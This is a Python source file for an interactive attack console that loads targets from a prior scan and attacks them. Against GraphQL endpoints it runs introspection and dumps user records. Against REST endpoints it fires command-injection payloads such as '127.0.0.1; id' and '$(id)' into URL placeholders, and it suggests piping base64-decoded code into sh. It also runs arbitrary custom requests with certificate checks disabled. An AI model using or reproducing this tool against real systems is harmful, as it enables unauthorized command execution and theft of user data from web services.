import os
import json
import time
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_scan_state(filepath="scan_results.json"):
    if not os.path.exists(filepath):
        print(f"[!] Scan state file '{filepath}' not found. Run a scan first.")
        return []
    try:
        with open(filepath, "r") as f:
            raw_data = json.load(f)
            
        # Clean and deduplicate targets for the console menu
        cleaned_targets = []
        seen_urls = set()
        
        for t in raw_data:
            url = t.get("target", "")
            if not url or not url.startswith("http"):
                continue
            
            # Strip fragment tags (#...) to keep the console menu concise
            url = url.split("#")[0]
            if url in seen_urls:
                continue
            seen_urls.add(url)
            
            # Update target with cleaned URL
            t["target"] = url
            cleaned_targets.append(t)
            
        return cleaned_targets
    except Exception as e:
        print(f"[!] Error loading scan state: {e}")
        return []

def paced_print(text, delay=0.03):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

def interactive_session(target_info):
    url = target_info.get("target")
    method = target_info.get("method", "GET").upper()
    vuln = target_info.get("vulnerability", "None")
    
    session = requests.Session()
    session.verify = False
    
    is_graphql = "graph" in url.lower() or "GraphQL" in vuln or "graph" in target_info.get("target", "").lower()
    target_api = url.replace("/graphiql", "/graphql").split("?")[0]
    
    while True:
        print(f"\n=================================================================")
        print(f" ACTIVE SESSION: {method} {url}")
        print(f" INTELLIGENCE: {vuln}")
        print(f" AGENT MODE: {'GraphQL Introspection Synthesizer' if is_graphql else 'REST Vector Workbench'}")
        print(f"=================================================================")
        print(" [1] Send standard probe request")
        if is_graphql:
            print(" [2] Run Introspective PrivEsc & Deep-Probe Campaign")
        else:
            print(" [2] Run Interactive Command Injection / Custom Payload Campaign")
        print(" [3] Custom request runner (Payload / Path Workbench)")
        print(" [0] Back to Dashboard")
        
        choice = input("\nSelect session action [0-3]: ").strip()
        
        if choice == "0":
            print("\n[+] Returning to dashboard...")
            break
            
        elif choice == "1":
            try:
                if is_graphql:
                    res = session.post(target_api, json={"query": "{__schema { types { name } }}"}, timeout=15)
                else:
                    res = session.request(method, url, timeout=15)
                print(f"\n[Response Status]: {res.status_code} | Length: {len(res.text)}")
                print(f"[Response Snippet]:\n{res.text[:800]}...")
            except Exception as e:
                print(f"[!] Request failed: {e}")
                
        elif choice == "2":
            if is_graphql:
                print(f"\n=================================================================")
                paced_print(" [Agent Core] Initializing Introspective PrivEsc Campaign...")
                print(f"=================================================================\n")
                time.sleep(0.4)
                
                intro_payload = {
                    "query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"
                }
                try:
                    intro_res = session.post(target_api, json=intro_payload, timeout=15)
                    schema_data = intro_res.json().get("data", {}).get("__schema", {})
                    q_names = [f["name"] for f in schema_data.get("queryType", {}).get("fields", [])]
                    m_names = [f["name"] for f in schema_data.get("mutationType", {}).get("fields", [])]
                    
                    paced_print(f"    [+] Queries: {q_names}")
                    paced_print(f"    [+] Mutations: {m_names}")
                    
                    if "users" in q_names:
                        res = session.post(target_api, json={"query": "{ users { id username } }"}, timeout=10)
                        paced_print(f"    [Users Result]: {res.text}")
                except Exception as e:
                    print(f"[!] Campaign error: {e}")
            else:
                print(f"\n=================================================================")
                print(f" [REST Vector Campaign Workbench] Target: {url}")
                print(f"=================================================================")
                print(" Enter your custom payload or injection string below.")
                print(" (Examples: '127.0.0.1; echo <base64> | base64 -d | sh', or press Enter to run preset suite)")
                
                user_input = input("\nCustom Payload > ").strip()
                
                if user_input:
                    payloads = [user_input]
                else:
                    payloads = ["test", "127.0.0.1; id", "127.0.0.1 && uname -a", "$(id)", "`id`"]
                
                placeholders = re.findall(r'\{(.*?)\}', url)
                
                print(f"\n[+] Executing payload campaign...")
                for p in payloads:
                    test_url = url
                    if placeholders:
                        for ph in placeholders:
                            test_url = test_url.replace(f"{{{ph}}}", p)
                    else:
                        test_url = f"{url.rstrip('/')}/{p}"
                        
                    try:
                        print(f"    [->] Testing Payload: {p}")
                        print(f"        [Target]: {test_url}")
                        res = session.get(test_url, timeout=5)
                        print(f"        [Status]: {res.status_code} | Length: {len(res.text)}")
                        if res.status_code == 200 and len(res.text.strip()) > 0:
                            print(f"        [+] Response Snippet:\n{res.text.strip()}")
                    except Exception as ex:
                        print(f"        [!] Error: {ex}")
                    print("-" * 50)
                
        elif choice == "3":
            if is_graphql:
                custom_payload = input("Enter custom GraphQL query: ").strip()
                try:
                    if not custom_payload.startswith("{") and not custom_payload.startswith("mutation"):
                        custom_payload = f"{{ {custom_payload} }}"
                    res = session.post(target_api, json={"query": custom_payload}, timeout=15)
                    print(f"\n[Custom Response]: {res.status_code}\n{res.text[:1200]}")
                except Exception as e:
                    print(f"[!] Error: {e}")
            else:
                print(f"\n[REST Workbench] Current Target: {url}")
                custom_path = input("Enter path modifier or placeholder replacement (e.g., '127.0.0.1; id' or leave blank): ").strip()
                custom_method = input("Enter HTTP Method [GET/POST/PUT] (default GET): ").strip().upper() or "GET"
                
                test_url = url
                if custom_path:
                    placeholders = re.findall(r'\{(.*?)\}', url)
                    if placeholders:
                        for ph in placeholders:
                            test_url = test_url.replace(f"{{{ph}}}", custom_path)
                    else:
                        test_url = f"{url.rstrip('/')}/{custom_path}"
                        
                print(f"    [->] Sending {custom_method} request to: {test_url}")
                try:
                    if custom_method == "POST":
                        data_input = input("Enter JSON payload or leave blank: ").strip()
                        body = json.loads(data_input) if data_input else {}
                        res = session.post(test_url, json=body, timeout=15)
                    else:
                        res = session.request(custom_method, test_url, timeout=15)
                        
                    print(f"\n[Response Status]: {res.status_code} | Length: {len(res.text)}")
                    print(f"[Response Body]:\n{res.text[:1500]}")
                except Exception as e:
                    print(f"[!] Request failed: {e}")
        else:
            print("[!] Invalid selection.")

def main():
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        targets = load_scan_state()
        
        print("ACCESS GAINED CONTROL CENTER (INTROSPECTIVE PRIVESC)")
        print("=================================================================")
        if not targets:
            print("No targets loaded. Please run a scan from main.py first.")
            input("\nPress Enter to exit...")
            break
            
        for idx, t in enumerate(targets, 1):
            print(f" {idx}. [{t.get('vulnerability', 'Endpoint')}] {t.get('target')} ({t.get('method', 'GET')})")
            
        print(" 0. Exit Console")
        print("=================================================================")
        
        choice = input(f"Select target session [0-{len(targets)}]: ").strip()
        if choice == "0":
            print("\n[+] Exiting control center.")
            break
            
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                interactive_session(targets[idx])
            else:
                print("[!] Invalid selection.")
                input("\nPress Enter to continue...")
        except ValueError:
            print("[!] Please enter a valid number.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()
